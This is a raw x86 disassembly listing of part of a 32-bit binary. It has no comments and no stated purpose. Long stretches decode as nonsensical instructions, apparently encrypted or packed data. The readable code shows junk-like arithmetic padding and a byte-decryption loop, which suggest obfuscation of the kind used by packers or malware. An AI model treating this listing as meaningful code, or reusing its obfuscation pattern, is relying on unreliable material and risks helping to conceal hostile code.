  4164ea:	jle    0x4164ef
  4164ec:	int    0xe0
  4164ee:	retf   
  4164ef:	or     ecx,DWORD PTR [ebx]
  4164f1:	mov    esi,DWORD PTR [eax-0x56582b92]
  4164f7:	(bad)  
  4164f8:	shl    DWORD PTR [edx+0x1da8fc2],cl
  4164fe:	int    0x52
  416500:	and    DWORD PTR [ecx-0x3fdb1bae],edx
  416506:	fs stos DWORD PTR es:[edi],eax
  416508:	sub    al,0x2e
  41650a:	mov    dl,0x61
  41650c:	int3   
  41650d:	push   esp
  41650e:	inc    ecx
  41650f:	scas   al,BYTE PTR es:[edi]
  416510:	xchg   edx,eax
  416511:	xor    al,0xb4
  416513:	out    0x31,eax
  416515:	not    BYTE PTR [ecx+ebx*2+0x11266b80]
  41651c:	and    dl,ch
  41651e:	jbe    0x41653b
  416520:	add    BYTE PTR [eax-0x62],al
  416523:	dec    esp
  416524:	xchg   DWORD PTR [ecx+0x11],edi
  416527:	data16 (bad) 
  416529:	sub    al,0xfc
  41652b:	test   al,0x9c
  41652d:	mov    cl,0x6c
  41652f:	push   ds
  416530:	out    dx,al
  416531:	popa   
  416532:	xor    bh,BYTE PTR [ebx-0x7b1a0502]
  416538:	push   eax
  416539:	dec    ecx
  41653a:	xchg   esi,eax
  41653b:	jbe    0x41655c
  41653d:	mov    ds:0xed395adb,al
  416542:	inc    esi
  416543:	cli    
  416544:	fbstp  TBYTE PTR [ebp+0x36]
  416547:	(bad)  
  416548:	aam    0x16
  41654a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41654b:	dec    ebp
  41654c:	and    cl,0x5c
  41654f:	imul   edx,edi,0xf695824f
  416555:	iret   
  416556:	mov    BYTE PTR [eax],0x26
  416559:	add    DWORD PTR [eax+0x33e4c113],ebx
  41655f:	mov    ecx,0xc80b02e8
  416565:	push   ecx
  416566:	lea    eax,[ebp-0x2c]
  416569:	push   eax
  41656a:	mov    eax,DWORD PTR [ebp+0x10]
  41656d:	mov    ecx,DWORD PTR [ebp+0x14]
  416570:	shrd   eax,ecx,0x2
  416574:	shr    ecx,0x2
  416577:	mov    ecx,DWORD PTR [ebp+0x10]
  41657a:	mov    edx,DWORD PTR [ebp+0x14]
  41657d:	xor    edx,edx
  41657f:	shl    ecx,0x1e
  416582:	mov    ecx,DWORD PTR [ebp+0x10]
  416585:	xor    eax,esi
  416587:	or     eax,edx
  416589:	mov    edx,DWORD PTR [ebp+0x14]
  41658c:	shrd   ecx,edx,0x2
  416590:	shr    edx,0x2
  416593:	mov    edx,DWORD PTR [ebp+0x10]
  416596:	mov    ebx,DWORD PTR [ebp+0x14]
  416599:	xor    ecx,esi
  41659b:	xor    ebx,ebx
  41659d:	or     ecx,ebx
  41659f:	shl    edx,0x1e
  4165a2:	add    eax,ecx
  4165a4:	mov    ecx,DWORD PTR [ebp+0x10]
  4165a7:	mov    edx,DWORD PTR [ebp+0x14]
  4165aa:	shrd   ecx,edx,0x2
  4165ae:	shr    edx,0x2
  4165b1:	xor    ecx,esi
  4165b3:	mov    edx,DWORD PTR [ebp+0x10]
  4165b6:	mov    ebx,DWORD PTR [ebp+0x14]
  4165b9:	xor    ebx,ebx
  4165bb:	or     ecx,ebx
  4165bd:	add    eax,ecx
  4165bf:	lea    eax,[ebp+eax*4-0x78]
  4165c3:	push   eax
  4165c4:	shl    edx,0x1e
  4165c7:	call   0x415231
  4165cc:	mov    eax,DWORD PTR [ebp-0x7c]
  4165cf:	mov    ecx,DWORD PTR [ebp-0x7c]
  4165d2:	xor    eax,edi
  4165d4:	xor    ecx,0xfffffffe
  4165d7:	shr    eax,0x2
  4165da:	shl    ecx,0x1e
  4165dd:	or     ecx,eax
  4165df:	mov    DWORD PTR [ebp-0x7c],ecx
  4165e2:	lea    eax,[ebp-0x7c]
  4165e5:	push   eax
  4165e6:	mov    eax,DWORD PTR [ebp+0x10]
  4165e9:	mov    ecx,DWORD PTR [ebp+0x14]
  4165ec:	shrd   eax,ecx,0x2
  4165f0:	shr    ecx,0x2
  4165f3:	mov    ecx,DWORD PTR [ebp+0x10]
  4165f6:	mov    edx,DWORD PTR [ebp+0x14]
  4165f9:	xor    eax,esi
  4165fb:	xor    edx,edx
  4165fd:	or     eax,edx
  4165ff:	push   eax
  416600:	mov    eax,ds:0x4225e8
  416605:	mov    edi,0x42252e
  41660a:	push   edi
  41660b:	push   DWORD PTR [eax]
  41660d:	shl    ecx,0x1e
  416610:	call   0x41e9f9
  416615:	lea    eax,[ebp-0x7c]
  416618:	push   eax
  416619:	mov    eax,DWORD PTR [ebp+0x10]
  41661c:	mov    ecx,DWORD PTR [ebp+0x14]
  41661f:	shrd   eax,ecx,0x2
  416623:	shr    ecx,0x2
  416626:	mov    ecx,DWORD PTR [ebp+0x10]
  416629:	mov    edx,DWORD PTR [ebp+0x14]
  41662c:	xor    eax,esi
  41662e:	xor    edx,edx
  416630:	or     eax,edx
  416632:	push   eax
  416633:	mov    eax,ds:0x4225e8
  416638:	push   edi
  416639:	push   DWORD PTR [eax]
  41663b:	shl    ecx,0x1e
  41663e:	call   0x41e9f9
  416643:	mov    eax,DWORD PTR [ebp-0x30]
  416646:	mov    eax,DWORD PTR [ebp-0x20]
  416649:	mov    edi,DWORD PTR [ebp-0x14]
  41664c:	mov    eax,DWORD PTR [ebp-0x24]
  41664f:	mov    ecx,edi
  416651:	mov    DWORD PTR [ebp-0x1c],eax
  416654:	rol    ecx,0x2
  416657:	mov    eax,0xa4069aae
  41665c:	xor    ecx,eax
  41665e:	cmp    ecx,eax
  416660:	je     0x416bfd
  416666:	mov    edx,0x1001
  41666b:	mov    ecx,DWORD PTR [ebp-0x1c]
  41666e:	xor    eax,eax
  416670:	test   ecx,ecx
  416672:	je     0x41669d
  416678:	mov    bl,BYTE PTR [eax+edi*1]
  41667b:	mov    BYTE PTR [ebp-0x1],bl
  41667e:	movzx  ebx,BYTE PTR [ebp-0x1]
  416682:	sub    ebx,0xec
  416688:	mov    BYTE PTR [ebp-0x1],bl
  41668b:	ror    BYTE PTR [ebp-0x1],1
  41668e:	mov    bl,BYTE PTR [ebp-0x1]
  416691:	mov    BYTE PTR [eax+edi*1],bl
  416694:	inc    eax
  416695:	cmp    eax,ecx
  416697:	jb     0x416678
  41669d:	dec    edx
  41669e:	jne    0x41666b
  4166a4:	mov    eax,DWORD PTR [ebp+0x8]
  4166a7:	mov    ecx,DWORD PTR [ebp+0xc]
  4166aa:	shrd   eax,ecx,0x2
  4166ae:	shr    ecx,0x2
  4166b1:	mov    ecx,DWORD PTR [ebp+0x8]
  4166b4:	mov    edx,DWORD PTR [ebp+0xc]
  4166b7:	xor    eax,esi
  4166b9:	xor    edx,edx
  4166bb:	or     eax,edx
  4166bd:	push   0x1
  4166bf:	add    eax,edi
  4166c1:	push   eax
  4166c2:	lea    eax,[ebp-0x2]
  4166c5:	push   eax
  4166c6:	shl    ecx,0x1e
  4166c9:	call   0x415231
  4166ce:	mov    eax,DWORD PTR [ebp+0x10]
  4166d1:	mov    ecx,DWORD PTR [ebp+0x14]
  4166d4:	shrd   eax,ecx,0x2
  4166d8:	shr    ecx,0x2
  4166db:	mov    ecx,DWORD PTR [ebp+0x10]
  4166de:	mov    edx,DWORD PTR [ebp+0x14]
  4166e1:	xor    eax,esi
  4166e3:	xor    edx,edx
  4166e5:	or     eax,edx
  4166e7:	add    eax,edi
  4166e9:	push   0x1
  4166eb:	push   eax
  4166ec:	mov    eax,DWORD PTR [ebp+0x8]
  4166ef:	shl    ecx,0x1e
  4166f2:	mov    ecx,DWORD PTR [ebp+0xc]
  4166f5:	shrd   eax,ecx,0x2
  4166f9:	shr    ecx,0x2
  4166fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4166ff:	mov    edx,DWORD PTR [ebp+0xc]
  416702:	xor    eax,esi
  416704:	xor    edx,edx
  416706:	or     eax,edx
  416708:	add    eax,edi
  41670a:	push   eax
  41670b:	shl    ecx,0x1e
  41670e:	call   0x415231
  416713:	push   0x1
  416715:	jmp    0x416975
  41671a:	out    dx,eax
  41671b:	(bad)
  41671f:	mov    dl,0x2a
  416721:	dec    esi
  416722:	xchg   ebx,eax
  416723:	fistp  WORD PTR [ebp+0x16abcf70]
  416729:	stos   BYTE PTR es:[edi],al
  41672a:	ja     0x416728
  41672c:	push   ss
  41672d:	sbb    BYTE PTR [ebx-0x56e7e7ec],bl
  416733:	xchg   ebp,eax
  416734:	adc    al,0x29
  416736:	pop    esi
  416737:	es ds out dx,eax
  41673a:	push   ss
  41673b:	sub    eax,0x1167e81b
  416740:	ror    BYTE PTR [eax-0x31],cl
  416743:	sub    BYTE PTR [eax+ebp*2],0xca
  416747:	mov    ds,WORD PTR [ecx]
  416749:	js     0x416789
  41674b:	in     al,dx
  41674c:	mov    bh,0xc7
  41674e:	(bad)  
  416750:	call   0x4feb:0xeadc1c46
  416757:	popa   
  416758:	inc    edx
  416759:	inc    ecx
  41675a:	imul   ebp,DWORD PTR [esi+0x1762c288],0x2bd473a
  416764:	addr16 push edx
  416766:	cmp    BYTE PTR [ebx+0x2bffb107],al
  41676c:	ss popa 
  41676e:	cmp    al,0x80
  416770:	mov    dl,0x2
  416772:	push   ds
  416773:	dec    esi
  416774:	xchg   esi,eax
  416775:	test   BYTE PTR [eax-0x7a],bl
  416778:	xchg   DWORD PTR [edi],esp
  41677a:	or     al,0x18
  41677c:	adc    DWORD PTR [esi+0x40],ecx
  41677f:	and    BYTE PTR [edx-0x64],dl
  416782:	mov    ds:0xa17ff52b,al
  416787:	(bad)  
  416789:	mov    bl,0x46
  41678b:	cs adc al,0xfd
  41678e:	and    esi,ecx
  416790:	or     edx,DWORD PTR [ecx-0x6e3dee1c]
  416796:	pop    edi
  416797:	aas    
  416798:	scas   al,BYTE PTR es:[edi]
  416799:	mov    esp,esp
  41679b:	daa    
  41679c:	mov    ds:0x3fc894ed,eax
  4167a1:	xchg   ecx,eax
  4167a2:	pop    esp
  4167a3:	test   esi,esp
  4167a5:	mov    esi,0x7c5e4d72
  4167aa:	aad    0x9a
  4167ac:	xchg   edi,eax
  4167ad:	sub    al,0x0
  4167af:	sub    DWORD PTR [esi],eax
  4167b1:	ins    DWORD PTR es:[edi],dx
  4167b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167b3:	jg     0x41679b
  4167b5:	shl    BYTE PTR [edi-0x6d679c5c],1
  4167bb:	xor    al,0xd7
  4167bd:	inc    edi
  4167be:	mov    ah,0x6
  4167c0:	ins    DWORD PTR es:[edi],dx
  4167c1:	(bad)  
  4167c2:	dec    edi
  4167c3:	xchg   BYTE PTR [ecx],bl
  4167c5:	mov    bh,0x9e
  4167c7:	dec    ecx
  4167c8:	test   al,0x6f
  4167ca:	cld    
  4167cb:	ror    al,1
  4167cd:	out    dx,al
  4167ce:	bound  esp,QWORD PTR [ebx]
  4167d0:	shr    edx,cl
  4167d2:	mov    edi,0x9fb778fa
  4167d7:	gs inc eax
  4167d9:	jecxz  0x416840
  4167db:	or     ebp,esi
  4167dd:	out    dx,eax
  4167de:	sbb    DWORD PTR [edi+ebp*8-0x25d8b4c9],ebx
  4167e5:	call   0xda29:0x41184577
  4167ec:	inc    edi
  4167ed:	iret   
  4167ee:	add    DWORD PTR [ebx+0x37],esp
  4167f1:	arpl   WORD PTR [edx+esi*1],sp
  4167f4:	mov    bh,0xcb
  4167f6:	mov    ds:0x4dc6a153,eax
  4167fb:	(bad)  
  4167fc:	xor    al,0x24
  4167fe:	out    dx,eax
  4167ff:	jb     0x416831
  416801:	retf   
  416802:	jno    0x416852
  416804:	and    DWORD PTR [edx+esi*1],eax
  416807:	and    ch,BYTE PTR [ebx-0x468231f5]
  41680d:	inc    ecx
  41680e:	add    al,0x8
  416810:	fisttp DWORD PTR [edx-0x40]
  416813:	dec    ebp
  416814:	or     DWORD PTR [ebx+0x2fae7aea],0x4
  41681b:	or     ebx,eax
  41681d:	out    dx,al
  41681e:	jg     0x416864
  416820:	jnp    0x416823
  416822:	push   0x27
  416824:	xor    esi,DWORD PTR gs:[edi+0x7d]
  416828:	hlt    
  416829:	(bad)  
  41682a:	mov    edi,0x2a99c75d
  41682f:	(bad)  
  416830:	stos   BYTE PTR es:[edi],al
  416831:	add    al,0x34
  416833:	mov    bl,0x50
  416835:	or     BYTE PTR [edi],cl
  416837:	mov    ch,0x43
  416839:	add    al,0xaa
  41683b:	mov    ds:0xfd16e3fa,al
  416840:	popf   
  416841:	pop    ebp
  416842:	jg     0x416863
  416844:	in     eax,dx
  416845:	jno    0x4168c1
  416847:	inc    edi
  416848:	dec    ebx
  416849:	aaa    
  41684a:	mov    al,0xec
  41684c:	loopne 0x4167e8
  41684e:	jge    0x41684a
  416850:	xor    cl,cl
  416852:	shl    DWORD PTR [edx],1
  416854:	xchg   esi,eax
  416855:	push   ss
  416856:	gs push esp
  416858:	dec    ebx
  416859:	stos   BYTE PTR es:[edi],al
  41685a:	push   ss
  41685b:	push   esp
  41685c:	adc    eax,0xcf44af86
  416861:	cdq    
  416862:	lea    edx,[esi-0x3f]
  416865:	sub    al,0x44
  416867:	inc    esi
  416868:	xchg   edi,eax
  416869:	push   ebp
  41686a:	call   0x2a58e70a
  41686f:	dec    esp
  416870:	mov    dh,0x4f
  416872:	scas   al,BYTE PTR es:[edi]
  416873:	add    ah,BYTE PTR ds:0x6db696d1
  416879:	dec    esp
  41687a:	mov    ah,0x45
  41687c:	sub    dl,0x74
  41687f:	(bad)  
  416880:	out    0x81,eax
  416882:	add    bl,BYTE PTR [eax-0x7c]
  416885:	scas   al,BYTE PTR es:[edi]
  416886:	mov    eax,0x92819d5d
  41688b:	sbb    DWORD PTR [edi+0x73],ebx
  41688e:	into   
  41688f:	outs   dx,BYTE PTR ds:[esi]
  416890:	clc    
  416891:	int    0x1c
  416893:	and    DWORD PTR [edi],ebp
  416895:	pop    esp
  416896:	test   BYTE PTR [ebx],ch
  416898:	sub    DWORD PTR [ebx+0x16b57928],edi
  41689e:	ds (bad) 
  4168a1:	fwait
  4168a2:	cmp    ebp,edx
  4168a4:	retf   0xdfb1
  4168a7:	out    dx,al
  4168a8:	arpl   WORD PTR [eax-0x71],bx
  4168ab:	jge    0x416832
  4168ad:	inc    edx
  4168ae:	rol    DWORD PTR [ecx+0x7a],cl
  4168b1:	in     eax,dx
  4168b2:	inc    esi
  4168b3:	repnz sar ebx,1
  4168b6:	aas    
  4168b7:	mov    edi,0xe6f12d62
  4168bc:	add    DWORD PTR [eax],ebx
  4168be:	int3   
  4168bf:	sbb    BYTE PTR [edi],ah
  4168c1:	dec    edi
  4168c2:	add    eax,0x644e7c8d
  4168c7:	xor    al,0x2b
  4168c9:	mov    ds:0x5da0e5c9,eax
  4168ce:	xchg   edx,eax
  4168cf:	cdq    
  4168d0:	inc    esi
  4168d1:	sub    bl,BYTE PTR [eax-0x37]
  4168d4:	push   ss
  4168d5:	lea    ecx,[eax]
  4168d7:	lahf   
  4168d8:	daa    
  4168d9:	jb     0x416920
  4168db:	mov    ebx,0x19f1b7f9
  4168e0:	mov    ecx,0x61bd56fc
  4168e5:	adc    ecx,DWORD PTR [eax]
  4168e7:	(bad)  
  4168e9:	mov    ebx,0xa776fc5a
  4168ee:	mov    esi,fs
  4168f0:	mov    ecx,0x19da3069
  4168f5:	mov    bl,0x72
  4168f7:	arpl   WORD PTR [esi+0x7ea116df],dx
  4168fd:	lds    ebx,FWORD PTR [ecx-0x35018fa]
  416903:	xor    eax,0x7d6aeab
  416908:	ins    BYTE PTR es:[edi],dx
  416909:	fcom   QWORD PTR [edi+0x725de5d9]
  41690f:	jecxz  0x4168da
  416911:	(bad)  
  416913:	out    0xb1,al
  416915:	(bad)  
  416916:	mov    ch,0xa4
  416918:	lock mov al,0xca
  41691b:	ss add dh,ah
  41691e:	dec    eax
  41691f:	fnsave [ebx-0x78]
  416922:	xchg   ecx,eax
  416923:	repnz call 0x3ce5:0x91b69500
  41692b:	bound  ecx,QWORD PTR [eax+0x77a1dfd5]
  416931:	xor    BYTE PTR [ecx+0x4d],0xa3
  416935:	lds    eax,FWORD PTR [ebp+0x5ce315f9]
  41693b:	mov    ecx,0xad5854c1
  416940:	scas   eax,DWORD PTR es:[edi]
  416941:	push   eax
  416942:	mov    esp,0x229370ea
  416947:	popa   
  416948:	cld    
  416949:	inc    esi
  41694a:	jno    0x4168db
  41694c:	push   edi
  41694d:	pushf  
  41694e:	xlat   BYTE PTR ds:[ebx]
  41694f:	in     al,dx
  416950:	call   0xf63c6690
  416955:	inc    esp
  416956:	pop    edi
  416957:	sub    eax,0xfbe9e415
  41695c:	lods   eax,DWORD PTR ds:[esi]
  41695d:	or     eax,0x9fe6cb49
  416962:	xor    DWORD PTR [edi-0x46556a7a],0x7f885b97
  41696c:	ja     0x41696e
  41696e:	and    BYTE PTR [eax+0x1a],ch
  416971:	pushf  
  416972:	scas   eax,DWORD PTR es:[edi]
  416973:	dec    ebx
  416974:	sbb    DWORD PTR [ebp-0x74af01bb],ecx
  41697a:	inc    ebp
  41697b:	adc    BYTE PTR [ebx-0x53f0ebb3],cl
  416981:	enter  0xc102,0xe9
  416985:	add    cl,BYTE PTR [ebx+0x558b104d]
  41698b:	adc    al,0x33
  41698d:	(bad)  
  41698e:	jmp    0x416bee
  416993:	mov    eax,0x2c1e900d
  416998:	sbb    ah,BYTE PTR [esi-0xf757786]
  41699e:	mov    esi,0xb07d4e07
  4169a3:	stc    
  4169a4:	clc    
  4169a5:	push   ss
  4169a6:	sbb    BYTE PTR [ebx+0x9181814],bl
  4169ac:	or     BYTE PTR [edi-0x6d3d4fd1],bl
  4169b2:	fcomp  DWORD PTR [edx]
  4169b4:	adc    DWORD PTR [ecx],ebp
  4169b6:	aam    0xb0
  4169b8:	sub    BYTE PTR [ecx],al
  4169ba:	push   cs
  4169bb:	pop    edi
  4169bc:	jnp    0x4169e8
  4169be:	cmp    eax,0x83073987
  4169c3:	mov    edx,0xb8ded5ee
  4169c8:	scas   eax,DWORD PTR es:[edi]
  4169c9:	cwde   
  4169ca:	or     al,0x1
  4169cc:	cs (bad) 
  4169ce:	(bad)  [ebp+ebp*2+0x74]
  4169d2:	cmp    esi,DWORD PTR [edi]
  4169d4:	adc    al,0xef
  4169d6:	push   cs
  4169d7:	xchg   ebp,eax
  4169d8:	and    esp,DWORD PTR [ebp-0x1d35e1ba]
  4169de:	addr16 int 0xec
  4169e1:	cli    
  4169e2:	in     eax,dx
  4169e3:	adc    BYTE PTR [ebx+0x3f9e5ae0],dh
  4169e9:	mov    ch,0xb3
  4169eb:	inc    ebx
  4169ec:	ds addr16 std 
  4169ef:	add    al,0x19
  4169f1:	sqrtps xmm3,xmm6
  4169f4:	xor    esi,ecx
  4169f6:	test   al,0x4d
  4169f8:	cli    
  4169f9:	sub    dh,BYTE PTR [edi+0x43279607]
  4169ff:	adc    dl,bh
  416a01:	dec    ecx
  416a02:	stos   BYTE PTR es:[edi],al
  416a03:	es jg  0x416a5f
  416a06:	and    al,0x1b
  416a08:	ins    DWORD PTR es:[edi],dx
  416a09:	xchg   esi,eax
  416a0a:	dec    edx
  416a0b:	imul   edx,DWORD PTR [ebp+0x2],0x64be46f
  416a12:	mov    al,0x32
  416a14:	ins    DWORD PTR es:[edi],dx
  416a15:	inc    edi
  416a16:	cmp    edx,DWORD PTR [ebx+0x77]
  416a19:	cwde   
  416a1a:	jmp    0x4169fa
  416a1c:	lock push ebp
  416a1e:	sti    
  416a1f:	push   ebp
  416a20:	adc    cl,BYTE PTR [esi-0x4e]
  416a23:	jmp    0x416a1f
  416a25:	cld    
  416a26:	add    ebx,DWORD PTR [esi-0x56]
  416a29:	mov    bl,0xb3
  416a2b:	adc    DWORD PTR [eax+ebp*1-0x21db2dbb],edi
  416a32:	xchg   ecx,eax
  416a33:	and    cl,cl
  416a35:	xchg   ecx,edi
  416a37:	test   al,0x48
  416a39:	mov    ecx,0x1b5269f6
  416a3e:	push   ebx
  416a3f:	mov    eax,ds:0x526ac7b9
  416a44:	jmp    0xdf45:0x9c4bf078
  416a4b:	dec    esi
  416a4c:	outs   dx,BYTE PTR ds:[esi]
  416a4d:	mov    ah,0x95
  416a4f:	xor    ebp,edx
  416a51:	dec    ebx
  416a52:	and    BYTE PTR [edi+0x75727627],ch
  416a58:	ror    esp,cl
  416a5a:	(bad)
  416a5d:	sub    cl,BYTE PTR [edi-0x3df5e8f5]
  416a63:	mov    ?,WORD PTR [edx+0x5aa46bf9]
  416a69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a6a:	cmp    eax,0x445de787
  416a6f:	jmp    0x6be8a2a3
  416a74:	pop    ds
  416a75:	leave  
  416a76:	mov    ah,0xbb
  416a78:	scas   eax,DWORD PTR es:[edi]
  416a79:	sahf   
  416a7a:	popf   
  416a7b:	push   edi
  416a7c:	(bad)  
  416a7d:	mov    esi,0xa5f4e8b0
  416a82:	repz and DWORD PTR [esi],edx
  416a85:	push   eax
  416a86:	xchg   edx,eax
  416a87:	fisub  DWORD PTR [edx]
  416a89:	stc    
  416a8a:	or     al,0x20
  416a8c:	iret   
  416a8d:	mov    edx,0x41c59c0a
  416a92:	mov    edx,0x951be1f6
  416a97:	mov    ebx,0xdb7e0dcb
  416a9c:	scas   al,BYTE PTR es:[edi]
  416a9d:	dec    edi
  416a9e:	adc    ah,ah
  416aa0:	mov    bh,0x24
  416aa2:	lock dec esi
  416aa4:	pop    sp
  416aa6:	mov    ebx,0xbaec4422
  416aab:	mov    al,ds:0x9a463f4a
  416ab0:	fimul  WORD PTR [ecx-0x42]
  416ab3:	jae    0x416a4d
  416ab5:	neg    BYTE PTR [ebp+0x479f1d12]
  416abb:	cli    
  416abc:	and    ebp,esp
  416abe:	lods   eax,DWORD PTR ds:[esi]
  416abf:	mov    al,0x72
  416ac1:	(bad)  
  416ac2:	and    BYTE PTR [eax],al
  416ac4:	test   bh,bl
  416ac6:	ror    DWORD PTR [edx+0xa4b50ac],0x66
  416acd:	or     bh,BYTE PTR [edx+0x2b]
  416ad0:	cmp    eax,0xa43bd990
  416ad5:	jg     0x416b36
  416ad7:	jae    0x416b46
  416ad9:	jg     0x416a94
  416adb:	cmp    esp,DWORD PTR [eax+eiz*1+0x1e2ba71c]
  416ae2:	ret    
  416ae3:	mov    esp,0x7e830b05
  416ae8:	daa    
  416ae9:	xchg   ebp,eax
  416aea:	jne    0x416b57
  416aec:	sbb    BYTE PTR [ebx],ch
  416aee:	cdq    
  416aef:	and    BYTE PTR [ebp-0x180681d3],dh
  416af5:	and    BYTE PTR [edi-0x3a],dh
  416af8:	popa   
  416af9:	icebp  
  416afa:	mov    ss,WORD PTR [esi+eiz*8-0x3e]
  416afe:	das    
  416aff:	xor    al,0xb1
  416b01:	test   BYTE PTR [eax+0x41ec7b17],cl
  416b07:	sub    ecx,esp
  416b09:	cmp    esi,ecx
  416b0b:	mov    dh,0x24
  416b0d:	pushf  
  416b0e:	stc    
  416b0f:	ins    DWORD PTR es:[edi],dx
  416b10:	pop    ebp
  416b11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b12:	push   ds
  416b13:	mov    al,ds:0x98f0b8d9
  416b18:	fldlg2 
  416b1a:	pop    ebp
  416b1b:	sbb    esp,DWORD PTR [edi-0x12870517]
  416b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b22:	sbb    al,0xb0
  416b24:	mov    edi,0x4c4f280f
  416b29:	mov    ah,0x47
  416b2b:	ret    
  416b2c:	dec    ebx
  416b2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b2e:	lock cmp eax,0x3f64700f
  416b34:	mov    edi,0xa7a2d887
  416b39:	mov    ds:0x5957c1e9,eax
  416b3e:	inc    edi
  416b3f:	mov    ecx,0x3a8ec085
  416b44:	std    
  416b45:	xchg   ecx,eax
  416b46:	or     BYTE PTR [ebp-0x3a5e746a],dh
  416b4c:	pop    es
  416b4d:	add    esp,DWORD PTR [esi-0x28388c69]
  416b53:	fld    QWORD PTR [edi]
  416b55:	in     eax,0x50
  416b57:	fcom   DWORD PTR [ecx]
  416b59:	pop    ebp
  416b5a:	psllq  mm7,QWORD PTR [edx-0x2d]
  416b5e:	xor    al,0x78
  416b60:	in     al,dx
  416b61:	and    al,0xae
  416b63:	mov    esp,0x5f9defe
  416b68:	jae    0x416b5f
  416b6a:	popa   
  416b6b:	jle    0x416b8a
  416b6d:	pop    esi
  416b6e:	xor    DWORD PTR [ecx],eax
  416b70:	nop
  416b71:	out    dx,al
  416b72:	rol    BYTE PTR [ebx+eiz*1+0x446c2d00],1
  416b79:	pop    ss
  416b7a:	scas   al,BYTE PTR es:[edi]
  416b7b:	sahf   
  416b7c:	sbb    DWORD PTR [esi],edi
  416b7e:	retf   0x14bd
  416b81:	in     eax,dx
  416b82:	iret   
  416b83:	lods   eax,DWORD PTR ds:[esi]
  416b84:	pop    ebx
  416b85:	lds    ebx,FWORD PTR [ebp+0x401e6dc7]
  416b8b:	out    0x28,al
  416b8d:	sub    ch,BYTE PTR gs:[edx]
  416b90:	out    0x7f,eax
  416b92:	shl    BYTE PTR [esi],cl
  416b94:	xchg   ebx,eax
  416b95:	pop    ebp
  416b96:	stos   BYTE PTR es:[edi],al
  416b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b98:	inc    edx
  416b99:	rcr    ch,cl
  416b9b:	les    edi,FWORD PTR [esi+0x4f580bef]
  416ba1:	mov    bl,0x94
  416ba3:	mov    bl,0x83
  416ba5:	add    eax,DWORD PTR [edi+0x7c669a70]
  416bab:	and    esi,ebp
  416bad:	push   0xfa677807
  416bb2:	add    BYTE PTR [eax*4+0x1e41bef],dl
  416bb9:	scas   al,BYTE PTR es:[edi]
  416bba:	push   esp
  416bbb:	xor    esi,DWORD PTR ds:0xb9bc543d
  416bc1:	push   ss
  416bc2:	(bad)  
  416bc3:	cmc    
  416bc4:	repnz mov ds:0x32f59818,al
  416bca:	adc    eax,0xb31656e9
  416bcf:	and    DWORD PTR [esp+eiz*4+0x60],0x82648819
  416bd7:	icebp  
  416bd8:	jle    0x416b87
  416bda:	aas    
  416bdb:	mov    bh,0xf
  416bdd:	sbb    esi,DWORD PTR [esi+0x4126f1fc]
  416be3:	cmp    ebx,esi
  416be5:	iret   
  416be6:	cdq    
  416be7:	push   ds
  416be8:	dec    ebx
  416be9:	pop    ebp
  416bea:	ror    BYTE PTR [ecx+eax*2],0x42
  416bee:	xor    edx,edx
  416bf0:	or     eax,edx
  416bf2:	add    eax,edi
  416bf4:	push   eax
  416bf5:	shl    ecx,0x1e
  416bf8:	call   0x415231
  416bfd:	mov    eax,DWORD PTR [ebp+0x10]
  416c00:	mov    ecx,DWORD PTR [ebp+0x14]
  416c03:	shrd   eax,ecx,0x2
  416c07:	shr    ecx,0x2
  416c0a:	mov    ecx,DWORD PTR [ebp+0x10]
  416c0d:	mov    edx,DWORD PTR [ebp+0x14]
  416c10:	pop    edi
  416c11:	xor    eax,esi
  416c13:	xor    edx,edx
  416c15:	pop    esi
  416c16:	shl    ecx,0x1e
  416c19:	or     eax,edx
  416c1b:	pop    ebx
  416c1c:	leave  
  416c1d:	ret    0x10
  416c20:	or     eax,eax
  416c22:	mov    eax,DWORD PTR [esp+0x8]
  416c26:	sub    ecx,0x3e9e
  416c2c:	mov    ecx,DWORD PTR [esp+0x10]
  416c30:	or     ecx,eax
  416c32:	mov    DWORD PTR ds:0x4282af,ecx
  416c38:	mov    ecx,DWORD PTR [esp+0xc]
  416c3c:	jne    0x416c55
  416c42:	mov    eax,DWORD PTR [esp+0x4]
  416c46:	xor    DWORD PTR ds:0x4283db,0x1fc6
  416c50:	mul    ecx
  416c52:	ret    0x10
  416c55:	sub    DWORD PTR ds:0x42828b,0x3993
  416c5f:	push   ebx
  416c60:	sbb    DWORD PTR ds:0x428303,0x3efd
  416c6a:	mul    ecx
  416c6c:	add    DWORD PTR ds:0x428363,0x5330
  416c76:	mov    ebx,eax
  416c78:	xor    eax,eax
  416c7a:	add    eax,DWORD PTR ds:0x42824b
  416c80:	mov    eax,DWORD PTR [eax]
  416c82:	adc    DWORD PTR ds:0x42828f,eax
  416c88:	mov    eax,DWORD PTR [esp+0x8]
  416c8c:	mul    DWORD PTR [esp+0x14]
  416c90:	add    ebx,eax
  416c92:	mov    eax,DWORD PTR [esp+0x8]
  416c96:	mul    ecx
  416c98:	add    edx,ebx
  416c9a:	pop    ebx
  416c9b:	ret    0x10
  416c9e:	push   ebp
  416c9f:	mov    ebp,esp
  416ca1:	sub    esp,0x44
  416ca4:	push   ebx
  416ca5:	push   esi
  416ca6:	push   edi
  416ca7:	mov    DWORD PTR [ebp-0x18],0x2
  416cae:	mov    DWORD PTR [ebp-0x14],0x29f0
  416cb5:	mov    DWORD PTR [ebp-0x10],0x3716
  416cbc:	mov    DWORD PTR [ebp-0x2c],0x4e09
  416cc3:	mov    DWORD PTR [ebp-0x28],0x4497
  416cca:	mov    DWORD PTR [ebp-0x24],0x5
  416cd1:	mov    DWORD PTR [ebp-0x20],0x2a0a
  416cd8:	mov    DWORD PTR [ebp-0x1c],0x1
  416cdf:	mov    DWORD PTR [ebp-0xc],0xce6
  416ce6:	mov    DWORD PTR [ebp-0x8],0x12b3
  416ced:	mov    DWORD PTR [ebp-0x4],0xb09
  416cf4:	mov    DWORD PTR [ebp-0x44],0x7617
  416cfb:	mov    DWORD PTR [ebp-0x40],0x721a
  416d02:	mov    DWORD PTR [ebp-0x3c],0x5151
  416d09:	mov    DWORD PTR [ebp-0x38],0x14aa
  416d10:	mov    DWORD PTR [ebp-0x34],0x5a28
  416d17:	mov    DWORD PTR [ebp-0x30],0x19a8
